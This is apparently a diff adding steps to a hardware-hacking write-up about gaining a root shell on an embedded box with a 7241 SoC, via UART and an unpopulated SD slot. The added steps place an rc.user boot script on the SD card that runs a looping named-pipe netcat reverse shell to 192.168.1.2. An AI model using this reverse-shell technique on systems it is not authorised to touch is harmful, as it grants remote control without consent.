@@ -68,13 +68,37 @@ Some notes:
 ## Getting shells
 
 1. UART shell
+
 UART shell can be accessed via J301 header with the following pins respectively: GND-RX-TX-VCC. However, I did not manage to proceed further than the CFE shell, as the Linux system requires logging in. To access the CFE shell, press Ctrl+C repeatedly when powering up the device.
 
 2. System shell
+
 In order to get to the system shell, some techniques need to be used. 
 
 There is an unpopulated micro SD slot at J402 header. I initially thought it was the pinout of the flash chip, however by overlaying the images of the front and back of PCB and aligning the vias, I found out that it is not. The 7241 SoC has at least two SD/eMMC interfaces, one of the goes to the eMMC while the other goes to the header. An interesting note is that this SD card slot connects to the first SD/eMMC bus of the SoC (or at least first in the device tree used to compile the OS), thus getting the first number when enumerated (`mmcblk0` instead of `mmcblk1`). 
 
-This lefts the eMMC to the second node (mmcblk1). Booting up with a blank SD card reveals that unfortunately (fortunately for us), the system is hardcoded to use `mmcblk0` to mount /usr and /data. Moreover, it tries to run a script named `rc.user` at the root of the `usr` partition.
+You can solder a micro sd slot directly to J402 as its pinout is very straightforward. But for extra clarity, here's the J402 header pinout (from left to right, respectively):
+1. DAT1
+2. DAT0
+3. GND (VSS)
+4. CLK
+5. VCC (VDD)
+6. CMD
+7. DAT3
+8. DAT2
 
-With this knowledge, we will proceed to create two partitions on the card.
+This lefts the eMMC to the second node (mmcblk1). Booting up with a blank SD card reveals that unfortunately (fortunately for us), the system is hardcoded to use `mmcblk0` to mount /usr and /data. We also know the filesystem type of these two partitions are of ext4. Moreover, it tries to run a script named `rc.user` at the root of the `usr` partition.
+
+With this knowledge, we will proceed to create two partitions on the card. The first partition will be named `usr` and the second partition will be named `data`. 
+
+After creating the partitions, download Busybox for MIPS little endian (https://www.busybox.net/downloads/binaries/1.21.1/busybox-mipsel) and create a file named `rc.user` in root of `usr`. The `rc.user` file is a script that will be executed upon boot. We will use this opportunity to make it establish a reverse shell to our machine. Let's assume that our machine's address is 192.168.1.2.
+
+The `rc.user` script needs to do at least these following things:
+1. Copy busybox-mipsel to /bin: `cp busybox-mipsel /bin` because there is no `nc` utility in the box's stock `busybox`.
+2. Softlink the nc utility: `ln -s /bin/busybox-mipsel /bin/nc`
+3. (optional, if there is no DHCP) `ifconfig eth0 192.168.1.3`
+4. Establish reverse shell: `rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 4242 >/tmp/f`
+
+To have the system automatically reconnect without having to reboot when we mistakenly press Ctrl+C in the shell, it is good to put the 4th command in a infinite while loop.
+
+That's it! Now our SD card contains the neccessary files to begin hacking the box. Pop it in the soldered sd slot, power the box on and wait for the shell.
